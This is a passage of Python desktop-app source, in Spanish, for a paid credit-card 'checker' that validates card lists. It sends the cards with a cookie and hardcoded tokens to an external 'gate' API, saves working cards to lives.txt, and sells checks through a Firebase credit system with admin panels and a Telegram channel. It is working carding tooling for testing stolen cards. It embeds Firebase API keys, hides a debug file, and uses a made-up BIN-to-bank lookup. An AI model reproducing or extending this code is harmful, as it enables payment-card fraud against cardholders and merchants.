import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
from bs4 import BeautifulSoup
import threading
import queue
from tkinter import font as tkfont
import os
import random
from datetime import datetime
import json
import pyrebase
import ctypes
import webbrowser
from PIL import Image, ImageTk, ImageDraw
import io

# Configuración de Firebase (reemplaza con tus credenciales)
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyCH0DA0Ptc6s5AG17ho560wO5IeWu88EmQ",
    "authDomain": "checkerb-d4cea.firebaseapp.com",
    "databaseURL": "https://checkerbcc-d4cea-default-rtdb.firebaseio.com",
    "projectId": "checkerbcc-d4cea",
    "storageBucket": "checkerbcc-d4cea.appspot.com",
    "messagingSenderId": "92848736093",
    "appId": "1:92848736093:web:c0229f4d5e6ed5ed5ed5a3"
}

# Inicializar Firebase
try:
    firebase = pyrebase.initialize_app(FIREBASE_CONFIG)
    auth_firebase = firebase.auth()
    db_firebase = firebase.database()
    storage_firebase = firebase.storage()
except Exception as e:
    print(f"Error inicializando Firebase: {e}")

# Configuración global
API_URL = 'https://lunarcntr.xyz/nopsetted2/checkers/free/audible/api.php'
BASE_URL = 'https://lunarcntr.xyz/'
DATA_FILE = 'usuarios.json'
BINS_HISTORY_FILE = 'bins_history.json'

# Colores y estilo
COLOR_FONDO = "#121212"
COLOR_PRIMARIO = "#03DAC6"
COLOR_SECUNDARIO = "#BB86FC"
COLOR_TEXTO = "#FFFFFF"
COLOR_APROBADA = "#00FF7F"
COLOR_RECHAZADA = "#FF5555"
COLOR_BOTON = "#3700B3"
COLOR_BOTON_HOVER = "#6200EE"
COLOR_ENTRY = "#1E1E1E"
COLOR_BOTON_OSCURO = "#050505"
COLOR_ADMIN = "#FFA500"
COLOR_PERFIL = "#4CAF50"

# Variables de control
pausado = False
lista_tarjetas_actual = []
CREDITOS_POR_TARJETA = 5
usuario_actual = None
usuarios = {}
user_token = None
user_id_actual = None
tarjetas_aprobadas = 0
tarjetas_rechazadas = 0
total_tarjetas_aprobadas = 0
total_tarjetas_rechazadas = 0
bins_history = []
foto_perfil = None

# ================== FUNCIONES ADICIONALES ==================
def cargar_bins_history():
    """Carga el historial de BINs desde archivo"""
    global bins_history
    try:
        if os.path.exists(BINS_HISTORY_FILE):
            with open(BINS_HISTORY_FILE, 'r') as f:
                bins_history = json.load(f)
    except Exception as e:
        print(f"Error cargando historial de BINs: {e}")
        bins_history = []

def guardar_bins_history():
    """Guarda el historial de BINs en archivo"""
    try:
        with open(BINS_HISTORY_FILE, 'w') as f:
            json.dump(bins_history, f)
    except Exception as e:
        print(f"Error guardando historial de BINs: {e}")

def agregar_bin_al_historial(bin_num):
    """Agrega un BIN al historial si no existe"""
    global bins_history
    if bin_num not in bins_history:
        bins_history.append(bin_num)
        if len(bins_history) > 10:  # Mantener solo los últimos 10
            bins_history = bins_history[-10:]
        guardar_bins_history()

def obtener_info_bin(bin_num):
    """Obtiene información de un BIN (simulado)"""
    if len(bin_num) < 6:
        return {"error": "El BIN debe tener al menos 6 dígitos"}
    
    primer_digito = bin_num[0]
    primeros_dos = bin_num[:2]
    
    tipos_tarjeta = {
        '4': 'Visa',
        '5': 'Mastercard',
        '3': 'American Express',
        '6': 'Discover'
    }
    
    bancos = {
        '41': 'Banco Santander',
        '51': 'Banco de Chile',
        '52': 'Banco BCI',
        '34': 'Banco Estado',
        '37': 'Banco Falabella',
        '60': 'Banco Itaú'
    }
    
    paises = {
        '41': 'Chile',
        '51': 'Chile',
        '52': 'Chile',
        '34': 'Estados Unidos',
        '37': 'Estados Unidos',
        '60': 'Brasil'
    }
    
    return {
        'tipo': tipos_tarjeta.get(primer_digito, 'Desconocido'),
        'banco': bancos.get(primeros_dos, 'Desconocido'),
        'pais': paises.get(primeros_dos, 'Desconocido'),
        'nivel': 'Platinum' if int(primer_digito) % 2 == 0 else 'Gold',
        'prepagada': 'No' if primer_digito in ['4', '5'] else 'Sí'
    }

# ================== FUNCIONES FIREBASE ==================
def firebase_login(email, password):
    """Autentica al usuario en Firebase"""
    global user_token, user_id_actual
    try:
        user = auth_firebase.sign_in_with_email_and_password(email, password)
        user_token = user['idToken']
        user_id_actual = user['localId']
        return user
    except Exception as e:
        error_msg = str(e)
        if "INVALID_EMAIL" in error_msg:
            return "Correo electrónico inválido"
        elif "EMAIL_NOT_FOUND" in error_msg:
            return "Usuario no encontrado"
        elif "INVALID_PASSWORD" in error_msg:
            return "Contraseña incorrecta"
        else:
            return f"Error de autenticación: {error_msg}"

def firebase_register(email, password, username, invite_code=None):
    """Registra un nuevo usuario en Firebase"""
    try:
        user = auth_firebase.create_user_with_email_and_password(email, password)
        
        user_data = {
            "username": username,
            "creditos": 100 if invite_code else 0,
            "es_admin": False,
            "email": email,
            "fecha_registro": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "foto_perfil": "",
            "total_aprobadas": 0,
            "total_rechazadas": 0,
            "ultima_conexion": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        db_firebase.child("users").child(user['localId']).set(user_data, user['idToken'])
        return user
    except Exception as e:
        error_msg = str(e)
        if "EMAIL_EXISTS" in error_msg:
            return "El correo electrónico ya está registrado"
        elif "WEAK_PASSWORD" in error_msg:
            return "La contraseña es demasiado débil (mínimo 6 caracteres)"
        else:
            return f"Error de registro: {error_msg}"

def firebase_get_user_data(user_id, token):
    """Obtiene los datos del usuario desde Firebase"""
    try:
        user_data = db_firebase.child("users").child(user_id).get(token).val()
        return user_data
    except Exception as e:
        print(f"Error obteniendo datos de usuario: {e}")
        return None

def firebase_update_user_data(user_id, token, data):
    """Actualiza los datos del usuario en Firebase"""
    try:
        db_firebase.child("users").child(user_id).update(data, token)
        return True
    except Exception as e:
        print(f"Error actualizando datos de usuario: {e}")
        return False

def firebase_upload_profile_picture(user_id, token, image_path):
    """Sube una foto de perfil a Firebase Storage"""
    try:
        path = f"profile_pics/{user_id}.jpg"
        storage_firebase.child(path).put(image_path, token)
        url = storage_firebase.child(path).get_url(token)
        return url
    except Exception as e:
        print(f"Error subiendo foto de perfil: {e}")
        return None

# Cargar historial de BINs al inicio
cargar_bins_history()

# Cola para mensajes seguros entre hilos
message_queue = queue.Queue()

def mostrar_mensaje_seguro(tipo, mensaje):
    """Muestra mensajes en la interfaz de forma segura"""
    message_queue.put((tipo, mensaje))
    if root:
        root.event_generate('<<MessageQueued>>', when='tail')

def procesar_mensajes(event=None):
    """Procesa los mensajes en cola"""
    while not message_queue.empty():
        tipo, mensaje = message_queue.get()
        if tipo == "mensaje":
            mensaje_label.config(text=mensaje, fg=COLOR_PRIMARIO)
        elif tipo == "error":
            mensaje_label.config(text=mensaje, fg=COLOR_RECHAZADA)
        elif tipo == "aprovada":
            global tarjetas_aprobadas, total_tarjetas_aprobadas
            tarjetas_aprobadas += 1
            total_tarjetas_aprobadas += 1
            actualizar_contadores()
            mensaje_aprovada_text.insert("end", f"✓ {mensaje}\n", "live")
            mensaje_aprovada_text.tag_config("live", foreground=COLOR_APROBADA)
            mensaje_aprovada_text.see("end")
            
            if user_id_actual and user_token:
                firebase_update_user_data(user_id_actual, user_token, {
                    "total_aprobadas": total_tarjetas_aprobadas
                })
        elif tipo == "reprovada":
            global tarjetas_rechazadas, total_tarjetas_rechazadas
            tarjetas_rechazadas += 1
            total_tarjetas_rechazadas += 1
            actualizar_contadores()
            mensaje_reprovada_text.insert("end", f"✗ {mensaje}\n", "muerta")
            mensaje_reprovada_text.tag_config("muerta", foreground=COLOR_RECHAZADA)
            mensaje_reprovada_text.see("end")
            
            if user_id_actual and user_token:
                firebase_update_user_data(user_id_actual, user_token, {
                    "total_rechazadas": total_tarjetas_rechazadas
                })

def actualizar_contadores():
    """Actualiza los contadores de tarjetas"""
    contador_tarjetas.config(text=f"Tarjetas en lista: {len(lista_tarjetas_actual)}")
    contador_aprobadas.config(text=f"Aprobadas: {tarjetas_aprobadas} (Total: {total_tarjetas_aprobadas})")
    contador_rechazadas.config(text=f"Rechazadas: {tarjetas_rechazadas} (Total: {total_tarjetas_rechazadas})")

class HoverButton(tk.Button):
    """Botón con efecto hover personalizado"""
    def __init__(self, master, **kw):
        tk.Button.__init__(self, master=master, **kw)
        self.default_bg = self["bg"]
        self.default_fg = self["fg"]
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)

    def on_enter(self, e):
        self['bg'] = COLOR_BOTON_HOVER

    def on_leave(self, e):
        self['bg'] = self.default_bg

# ============= FUNCIONES PRINCIPALES =============
def pausar_verificacion():
    global pausado
    pausado = True
    btn_pausar.config(state="disabled")
    mostrar_mensaje_seguro("mensaje", "Verificación pausada")

def limpiar_lista():
    entry_lista_cartoes.delete("1.0", "end")
    global lista_tarjetas_actual, tarjetas_aprobadas, tarjetas_rechazadas
    lista_tarjetas_actual = []
    tarjetas_aprobadas = 0
    tarjetas_rechazadas = 0
    actualizar_contadores()
    mostrar_mensaje_seguro("mensaje", "Lista limpiada")

def enviar_datos():
    cookie = entry_cookie.get().strip()
    lista_tarjetas = entry_lista_cartoes.get("1.0", "end-1c").strip()
    
    if not cookie or not lista_tarjetas:
        mostrar_mensaje_seguro("error", "Error: Complete todos los campos")
        return

    try:
        data = {
            'cookie-input-2': cookie,
            'lista_cartoes': lista_tarjetas
        }
        
        response = requests.post(BASE_URL, data=data)
        
        if response.status_code == 200:
            mostrar_mensaje_seguro("mensaje", "CC'S ENVIADAS A GATE, ESTA TODO LISTO PARA INICIAR!")
        else:
            mostrar_mensaje_seguro("error", f"Error al enviar datos: {response.status_code}")
    except Exception as e:
        mostrar_mensaje_seguro("error", f"Error de conexión: {str(e)}")

def actualizar_lista_tarjetas():
    entry_lista_cartoes.delete("1.0", "end")
    entry_lista_cartoes.insert("1.0", "\n".join(lista_tarjetas_actual))
    actualizar_contadores()

def iniciar_verificacion():
    global lista_tarjetas_actual, pausado, tarjetas_aprobadas, tarjetas_rechazadas
    
    cookie = entry_cookie.get().strip()
    lista_tarjetas_actual = entry_lista_cartoes.get("1.0", "end-1c").strip().splitlines()
    pausado = False
    tarjetas_aprobadas = 0
    tarjetas_rechazadas = 0
    btn_pausar.config(state="normal")
    actualizar_contadores()
    
    if not cookie or not lista_tarjetas_actual:
        mostrar_mensaje_seguro("error", "Error: Complete todos los campos")
        return
    
    mostrar_mensaje_seguro("mensaje", "TEST COMENZADO")
    
    if not os.path.exists("lives.txt"):
        open("lives.txt", "w").close()

    def verificar_tarjetas():
        while lista_tarjetas_actual and not pausado:
            if usuarios[usuario_actual]['creditos'] < CREDITOS_POR_TARJETA:
                mostrar_mensaje_seguro("error", "Créditos insuficientes. Verificación detenida.")
                break
                
            tarjeta = lista_tarjetas_actual[0]
            
            if not tarjeta.strip():
                lista_tarjetas_actual.pop(0)
                continue
                
            try:
                data = {
                    "lista": tarjeta,
                    "cookie": cookie,
                    "x-main": "PAvDPuB1oIvS9u0UhBQH3FGyvIniqQSeaelFq1XlyDqIAFAAIYzVnXGU4x49UjE2",
                    "sst-main": "5st1|P0EL1YWj1Aj8oPdFPC0QzEZtCdmoWxze_wzATB6dEF7YksmAccYH1ZRCO6Tjg",
                    "ain": "es_US"
                }

                headers = {
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                
                response = requests.post(API_URL, data=data, headers=headers)
                response.encoding = 'utf-8'
                
                soup = BeautifulSoup(response.text, 'html.parser')
                html_text = soup.get_text().lower()
                
                if '#aprovada' in html_text and 'cartão autorizado' in html_text:
                    usuarios[usuario_actual]['creditos'] -= CREDITOS_POR_TARJETA
                    
                    if user_id_actual and user_token:
                        nuevos_creditos = usuarios[usuario_actual]['creditos']
                        if not firebase_update_user_data(user_id_actual, user_token, {"creditos": nuevos_creditos}):
                            mostrar_mensaje_seguro("error", "Error al actualizar créditos en la base de datos")
                    
                    root.after(0, actualizar_interfaz_usuario)
                    
                    mostrar_mensaje_seguro("aprovada", f"Tarjeta válida: {tarjeta} (Créditos: {usuarios[usuario_actual]['creditos']}")
                    with open("lives.txt", "a", encoding="utf-8") as f:
                        f.write(f"{tarjeta}\n")
                    lista_tarjetas_actual.pop(0)
                    root.after(0, actualizar_lista_tarjetas)
                elif '#reprovada' in html_text or 'cartão recusado' in html_text:
                    mostrar_mensaje_seguro("reprovada", f"Tarjeta rechazada: {tarjeta}")
                    with open("rechazadas.txt", "a", encoding="utf-8") as f:
                        f.write(f"{tarjeta}\n")
                    lista_tarjetas_actual.pop(0)
                    root.after(0, actualizar_lista_tarjetas)
                else:
                    mostrar_mensaje_seguro("error", f"No se pudo verificar: {tarjeta}")
                    with open("respuesta_debug.html", "w", encoding="utf-8") as f:
                        f.write(soup.prettify())
                    
                    try:
                        ctypes.windll.kernel32.SetFileAttributesW("respuesta_debug.html", 6)
                    except:
                        pass
                
            except requests.exceptions.RequestException as e:
                mostrar_mensaje_seguro("error", f"Error de conexión/cookie con tarjeta {tarjeta}: {str(e)}")
            except Exception as e:
                mostrar_mensaje_seguro("error", f"Error verificando tarjeta {tarjeta}: {str(e)}")
        
        if not pausado:
            mostrar_mensaje_seguro("mensaje", "TEST TERMINADO")
            btn_pausar.config(state="disabled")
    
    threading.Thread(target=verificar_tarjetas, daemon=True).start()

# ============= SISTEMA DE USUARIOS =============
def mostrar_login():
    frame_login.pack(fill='both', expand=True)
    frame_principal.pack_forget()

def ocultar_login():
    frame_login.pack_forget()
    frame_principal.pack(fill='both', expand=True)

def mostrar_registro():
    frame_registro.pack(fill='both', expand=True)
    frame_login.pack_forget()

def ocultar_registro():
    frame_registro.pack_forget()
    frame_login.pack(fill='both', expand=True)

def iniciar_sesion():
    global usuario_actual, user_token, user_id_actual, total_tarjetas_aprobadas, total_tarjetas_rechazadas
    
    email = entry_email.get().strip()
    password = entry_password.get().strip()
    
    if not email or not password:
        mensaje_error.config(text="Ingrese email y contraseña")
        return
    
    result = firebase_login(email, password)
    
    if isinstance(result, str):
        mensaje_error.config(text=result)
        btn_reintentar.pack(pady=5)
    else:
        user = result
        user_token = user['idToken']
        user_id_actual = user['localId']
        
        user_data = firebase_get_user_data(user['localId'], user_token)
        
        if user_data:
            usuario_actual = user_data['username']
            usuarios[usuario_actual] = {
                'creditos': user_data['creditos'],
                'es_admin': user_data.get('es_admin', False),
                'email': email,
                'user_id': user['localId'],
                'foto_perfil': user_data.get('foto_perfil', ''),
                'total_aprobadas': user_data.get('total_aprobadas', 0),
                'total_rechazadas': user_data.get('total_rechazadas', 0)
            }
            
            total_tarjetas_aprobadas = usuarios[usuario_actual]['total_aprobadas']
            total_tarjetas_rechazadas = usuarios[usuario_actual]['total_rechazadas']
            
            firebase_update_user_data(user['localId'], user_token, {
                "ultima_conexion": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            
            ocultar_login()
            actualizar_interfaz_usuario()
            mostrar_mensaje_seguro("mensaje", f"Bienvenido {usuario_actual}")
        else:
            mensaje_error.config(text="Error al obtener datos del usuario")
            btn_reintentar.pack(pady=5)

def registrar_usuario():
    email = entry_email_reg.get().strip()
    username = entry_usuario_reg.get().strip()
    password = entry_password_reg.get().strip()
    confirmar = entry_confirmar_reg.get().strip()
    codigo = entry_codigo_reg.get().strip()
    
    if not email or not username or not password:
        mensaje_error_reg.config(text="Email, usuario y contraseña son obligatorios")
        return
        
    if password != confirmar:
        mensaje_error_reg.config(text="Las contraseñas no coinciden")
        return
        
    if len(password) < 6:
        mensaje_error_reg.config(text="La contraseña debe tener al menos 6 caracteres")
        return
        
    result = firebase_register(email, password, username, codigo)
    
    if isinstance(result, str):
        mensaje_error_reg.config(text=result)
    else:
        mensaje_error_reg.config(text="Usuario registrado con éxito!", fg=COLOR_APROBADA)
        root.after(2000, ocultar_registro)

def abrir_panel_creditos():
    creditos = tk.Toplevel(root)
    creditos.title("Administrar Créditos")
    creditos.geometry("500x400")
    creditos.resizable(False, False)
    creditos.configure(bg=COLOR_FONDO)
    creditos.transient(root)
    creditos.grab_set()
    
    tk.Label(creditos, 
            text="Administrar Créditos", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(pady=10)
    
    frame_principal = tk.Frame(creditos, bg=COLOR_FONDO)
    frame_principal.pack(fill='both', expand=True, padx=20, pady=10)
    
    tk.Label(frame_principal, 
            text="Usuario:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    
    combo_usuarios = ttk.Combobox(frame_principal, 
                                values=list(usuarios.keys()),
                                font=custom_font,
                                state="readonly")
    combo_usuarios.pack(fill='x', pady=5)
    combo_usuarios.set(usuario_actual)
    
    label_creditos = tk.Label(frame_principal, 
                            text=f"Créditos actuales: {usuarios[usuario_actual]['creditos'] if usuario_actual else 0}", 
                            font=custom_font, 
                            fg=COLOR_TEXTO, 
                            bg=COLOR_FONDO)
    label_creditos.pack(anchor='w', pady=(10, 0))
    
    tk.Label(frame_principal, 
            text="Cantidad:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    
    entry_cantidad = tk.Entry(frame_principal, 
                            width=10, 
                            font=custom_font,
                            bg=COLOR_ENTRY, 
                            fg=COLOR_TEXTO,
                            insertbackground=COLOR_TEXTO)
    entry_cantidad.pack(fill='x', pady=5)
    
    def actualizar_creditos():
        usuario = combo_usuarios.get()
        cantidad = entry_cantidad.get().strip()
        
        if not usuario or not cantidad:
            messagebox.showerror("Error", "Seleccione usuario e ingrese cantidad")
            return
            
        try:
            cantidad = int(cantidad)
            if cantidad <= 0:
                messagebox.showerror("Error", "Ingrese una cantidad positiva")
                return
                
            user_id = usuarios[usuario].get('user_id')
            if user_id and user_token:
                nuevos_creditos = usuarios[usuario]['creditos'] + cantidad
                if firebase_update_user_data(user_id, user_token, {"creditos": nuevos_creditos}):
                    usuarios[usuario]['creditos'] = nuevos_creditos
                    label_creditos.config(text=f"Créditos actuales: {usuarios[usuario]['creditos']}")
                    
                    if usuario == usuario_actual:
                        actualizar_interfaz_usuario()
                        
                    messagebox.showinfo("Éxito", f"Se agregaron {cantidad} créditos a {usuario}")
                else:
                    messagebox.showerror("Error", "No se pudo actualizar los créditos")
        except ValueError:
            messagebox.showerror("Error", "Ingrese un número válido")
    
    btn_cargar = HoverButton(frame_principal, 
                           text="Agregar Créditos", 
                           command=actualizar_creditos,
                           bg=COLOR_SECUNDARIO, 
                           fg=COLOR_FONDO,
                           activebackground="#9C64FF",
                           activeforeground=COLOR_FONDO,
                           relief='flat',
                           font=custom_font_bold,
                           padx=15,
                           pady=5)
    btn_cargar.pack(pady=15)
    
    if usuarios[usuario_actual].get('es_admin'):
        btn_codigo = HoverButton(frame_principal, 
                               text="Generar Código Invitación", 
                               command=generar_codigo_invitacion,
                               bg=COLOR_ADMIN, 
                               fg=COLOR_FONDO,
                               activebackground="#FFC04D",
                               activeforeground=COLOR_FONDO,
                               relief='flat',
                               font=custom_font_bold,
                               padx=15,
                               pady=5)
        btn_codigo.pack()

def generar_codigo_invitacion():
    codigo = f"INV-{random.randint(1000, 9999)}"
    messagebox.showinfo("Código de Invitación", 
                      f"Código generado:\n\n{codigo}\n\nEste código dará 100 créditos al nuevo usuario")

def abrir_panel_admin():
    """Abre el panel de administración (solo para usuarios admin)"""
    if not usuario_actual or not usuarios[usuario_actual].get('es_admin'):
        messagebox.showerror("Error", "Acceso denegado: no tienes permisos de administrador")
        return
    
    admin_panel = tk.Toplevel(root)
    admin_panel.title("Panel de Administración")
    admin_panel.geometry("800x600")
    admin_panel.resizable(False, False)
    admin_panel.configure(bg=COLOR_FONDO)
    admin_panel.transient(root)
    admin_panel.grab_set()
    
    # Título
    tk.Label(admin_panel, 
            text="Panel de Administración", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(pady=10)
    
    # Frame principal con scroll
    canvas = tk.Canvas(admin_panel, bg=COLOR_FONDO, highlightthickness=0)
    scrollbar = ttk.Scrollbar(admin_panel, orient="vertical", command=canvas.yview)
    scrollable_frame = tk.Frame(canvas, bg=COLOR_FONDO)
    
    scrollable_frame.bind(
        "<Configure>",
        lambda e: canvas.configure(
            scrollregion=canvas.bbox("all")
        )
    )
    
    canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
    canvas.configure(yscrollcommand=scrollbar.set)
    
    canvas.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")
    
    # Lista de usuarios
    tk.Label(scrollable_frame, 
            text="Usuarios Registrados:", 
            font=custom_font_bold, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=(10, 5), padx=20)
    
    # Obtener todos los usuarios de Firebase
    try:
        all_users = db_firebase.child("users").get(user_token).val()
    except Exception as e:
        messagebox.showerror("Error", f"No se pudieron obtener los usuarios: {str(e)}")
        admin_panel.destroy()
        return
    
    # Frame para la tabla de usuarios
    frame_usuarios = tk.Frame(scrollable_frame, bg=COLOR_FONDO)
    frame_usuarios.pack(fill='x', padx=20, pady=5)
    
    # Encabezados de la tabla
    headers = ["Usuario", "Email", "Créditos", "Aprobadas", "Rechazadas", "Admin", "Acciones"]
    for i, header in enumerate(headers):
        tk.Label(frame_usuarios, 
                text=header, 
                font=custom_font_bold, 
                fg=COLOR_PRIMARIO, 
                bg=COLOR_FONDO,
                width=15 if i < len(headers)-1 else 20).grid(row=0, column=i, padx=2, pady=2)
    
    # Mostrar cada usuario en una fila
    row = 1
    for user_id, user_data in all_users.items():
        if not user_data:
            continue
            
        # Datos del usuario
        tk.Label(frame_usuarios, 
                text=user_data.get('username', 'N/A'), 
                font=custom_font, 
                fg=COLOR_TEXTO, 
                bg=COLOR_FONDO).grid(row=row, column=0, padx=2, pady=2)
        
        tk.Label(frame_usuarios, 
                text=user_data.get('email', 'N/A'), 
                font=custom_font, 
                fg=COLOR_TEXTO, 
                bg=COLOR_FONDO).grid(row=row, column=1, padx=2, pady=2)
        
        tk.Label(frame_usuarios, 
                text=str(user_data.get('creditos', 0)), 
                font=custom_font, 
                fg=COLOR_SECUNDARIO, 
                bg=COLOR_FONDO).grid(row=row, column=2, padx=2, pady=2)
        
        tk.Label(frame_usuarios, 
                text=str(user_data.get('total_aprobadas', 0)), 
                font=custom_font, 
                fg=COLOR_APROBADA, 
                bg=COLOR_FONDO).grid(row=row, column=3, padx=2, pady=2)
        
        tk.Label(frame_usuarios, 
                text=str(user_data.get('total_rechazadas', 0)), 
                font=custom_font, 
                fg=COLOR_RECHAZADA, 
                bg=COLOR_FONDO).grid(row=row, column=4, padx=2, pady=2)
        
        tk.Label(frame_usuarios, 
                text="Sí" if user_data.get('es_admin', False) else "No", 
                font=custom_font, 
                fg=COLOR_ADMIN if user_data.get('es_admin', False) else COLOR_TEXTO, 
                bg=COLOR_FONDO).grid(row=row, column=5, padx=2, pady=2)
        
        # Frame para botones de acciones
        frame_acciones = tk.Frame(frame_usuarios, bg=COLOR_FONDO)
        frame_acciones.grid(row=row, column=6, padx=2, pady=2)
        
        def make_toggle_admin(user_id=user_id, current=user_data.get('es_admin', False)):
            try:
                db_firebase.child("users").child(user_id).update({"es_admin": not current}, user_token)
                messagebox.showinfo("Éxito", f"Estado de admin cambiado para el usuario")
                admin_panel.destroy()
                abrir_panel_admin()
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo cambiar el estado: {str(e)}")
        
        btn_toggle_admin = HoverButton(frame_acciones, 
                                     text="Toggle Admin", 
                                     command=make_toggle_admin,
                                     bg=COLOR_ADMIN, 
                                     fg=COLOR_FONDO,
                                     activebackground="#FFC04D",
                                     activeforeground=COLOR_FONDO,
                                     relief='flat',
                                     font=custom_font,
                                     padx=5,
                                     pady=2)
        btn_toggle_admin.pack(side='left', padx=1)
        
        def make_delete_user(user_id=user_id, username=user_data.get('username', 'N/A')):
            if messagebox.askyesno("Confirmar", f"¿Eliminar al usuario {username}?"):
                try:
                    # Eliminar de la base de datos
                    db_firebase.child("users").child(user_id).remove(user_token)
                    # Eliminar de la autenticación (requiere privilegios de admin en Firebase)
                    auth_firebase.delete_user_account(user_token)
                    messagebox.showinfo("Éxito", "Usuario eliminado correctamente")
                    admin_panel.destroy()
                    abrir_panel_admin()
                except Exception as e:
                    messagebox.showerror("Error", f"No se pudo eliminar el usuario: {str(e)}")
        
        btn_eliminar = HoverButton(frame_acciones, 
                                 text="Eliminar", 
                                 command=make_delete_user,
                                 bg=COLOR_RECHAZADA, 
                                 fg=COLOR_FONDO,
                                 activebackground="#FF7777",
                                 activeforeground=COLOR_FONDO,
                                 relief='flat',
                                 font=custom_font,
                                 padx=5,
                                 pady=2)
        btn_eliminar.pack(side='left', padx=1)
        
        row += 1
    
    # Estadísticas generales
    tk.Label(scrollable_frame, 
            text="Estadísticas Generales:", 
            font=custom_font_bold, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w', pady=(20, 5), padx=20)
    
    frame_stats = tk.Frame(scrollable_frame, bg=COLOR_FONDO)
    frame_stats.pack(fill='x', padx=20, pady=5)
    
    total_usuarios = len(all_users)
    total_creditos = sum(user.get('creditos', 0) for user in all_users.values() if user)
    total_aprobadas = sum(user.get('total_aprobadas', 0) for user in all_users.values() if user)
    total_rechazadas = sum(user.get('total_rechazadas', 0) for user in all_users.values() if user)
    total_admins = sum(1 for user in all_users.values() if user and user.get('es_admin', False))
    
    stats = [
        f"Total usuarios: {total_usuarios}",
        f"Total créditos en sistema: {total_creditos}",
        f"Total tarjetas aprobadas: {total_aprobadas}",
        f"Total tarjetas rechazadas: {total_rechazadas}",
        f"Administradores: {total_admins}"
    ]
    
    for i, stat in enumerate(stats):
        tk.Label(frame_stats, 
                text=stat, 
                font=custom_font, 
                fg=COLOR_TEXTO, 
                bg=COLOR_FONDO).grid(row=i//2, column=i%2, sticky='w', padx=10, pady=2)
    
    # Botón para actualizar
    btn_actualizar = HoverButton(scrollable_frame, 
                               text="Actualizar Datos", 
                               command=lambda: [admin_panel.destroy(), abrir_panel_admin()],
                               bg=COLOR_SECUNDARIO, 
                               fg=COLOR_FONDO,
                               activebackground="#9C64FF",
                               activeforeground=COLOR_FONDO,
                               relief='flat',
                               font=custom_font_bold,
                               padx=15,
                               pady=5)
    btn_actualizar.pack(pady=20)

def actualizar_interfaz_usuario():
    if usuario_actual:
        etiqueta_usuario.config(text=f"Usuario: {usuario_actual}")
        etiqueta_creditos.config(text=f"Créditos: {usuarios[usuario_actual]['creditos']}")
        
        if usuarios[usuario_actual]['creditos'] < 10 * CREDITOS_POR_TARJETA:
            etiqueta_creditos.config(fg=COLOR_RECHAZADA)
        else:
            etiqueta_creditos.config(fg=COLOR_APROBADA)
        
        if usuarios[usuario_actual].get('es_admin'):
            btn_creditos.pack(side='left', padx=5, fill='x', expand=True)
            btn_admin.pack(side='left', padx=5, fill='x', expand=True)
        else:
            btn_creditos.pack_forget()
            btn_admin.pack_forget()
    else:
        etiqueta_usuario.config(text="No autenticado")
        etiqueta_creditos.config(text="Créditos: 0", fg=COLOR_TEXTO)
        btn_creditos.pack_forget()
        btn_admin.pack_forget()

def cerrar_sesion():
    global usuario_actual, user_token, user_id_actual, foto_perfil
    usuario_actual = None
    user_token = None
    user_id_actual = None
    foto_perfil = None
    mostrar_login()
    mostrar_mensaje_seguro("mensaje", "Sesión cerrada correctamente")

def abrir_telegram():
    webbrowser.open("https://t.me/bcccheckers")

# ============= PERFIL DE USUARIO =============
def abrir_perfil():
    """Abre la ventana de perfil del usuario"""
    if not usuario_actual:
        return
    
    perfil = tk.Toplevel(root)
    perfil.title(f"Perfil de {usuario_actual}")
    perfil.geometry("500x600")
    perfil.resizable(False, False)
    perfil.configure(bg=COLOR_FONDO)
    perfil.transient(root)
    perfil.grab_set()
    
    # Frame principal
    frame_principal = tk.Frame(perfil, bg=COLOR_FONDO)
    frame_principal.pack(fill='both', expand=True, padx=20, pady=20)
    
    # Foto de perfil
    global foto_perfil
    frame_foto = tk.Frame(frame_principal, bg=COLOR_FONDO)
    frame_foto.pack(pady=10)
    
    # Intentar cargar la foto de perfil desde Firebase
    foto_url = usuarios[usuario_actual].get('foto_perfil', '')
    img_perfil = None
    
    if foto_url:
        try:
            response = requests.get(foto_url)
            img_data = response.content
            img = Image.open(io.BytesIO(img_data))
            img = img.resize((150, 150), Image.LANCZOS)
            foto_perfil = ImageTk.PhotoImage(img)
            
            label_foto = tk.Label(frame_foto, 
                                image=foto_perfil, 
                                bg=COLOR_FONDO,
                                bd=0)
            label_foto.pack()
        except Exception as e:
            print(f"Error cargando foto de perfil: {e}")
            # Si hay error, mostrar imagen por defecto
            img = Image.new('RGB', (150, 150), color=(30, 30, 30))
            draw = ImageDraw.Draw(img)
            draw.text((50, 60), usuario_actual[0].upper(), fill=(255, 255, 255))
            foto_perfil = ImageTk.PhotoImage(img)
            label_foto = tk.Label(frame_foto, 
                                image=foto_perfil, 
                                bg=COLOR_FONDO,
                                bd=0)
            label_foto.pack()
    else:
        # Imagen por defecto con la inicial del usuario
        img = Image.new('RGB', (150, 150), color=(30, 30, 30))
        draw = ImageDraw.Draw(img)
        draw.text((50, 60), usuario_actual[0].upper(), fill=(255, 255, 255))
        foto_perfil = ImageTk.PhotoImage(img)
        label_foto = tk.Label(frame_foto, 
                            image=foto_perfil, 
                            bg=COLOR_FONDO,
                            bd=0)
        label_foto.pack()
    
    # Botón para cambiar foto
    btn_cambiar_foto = HoverButton(frame_foto, 
                                 text="Cambiar Foto", 
                                 command=lambda: cambiar_foto_perfil(perfil),
                                 bg=COLOR_PERFIL, 
                                 fg=COLOR_FONDO,
                                 activebackground="#66BB6A",
                                 activeforeground=COLOR_FONDO,
                                 relief='flat',
                                 font=custom_font,
                                 padx=10,
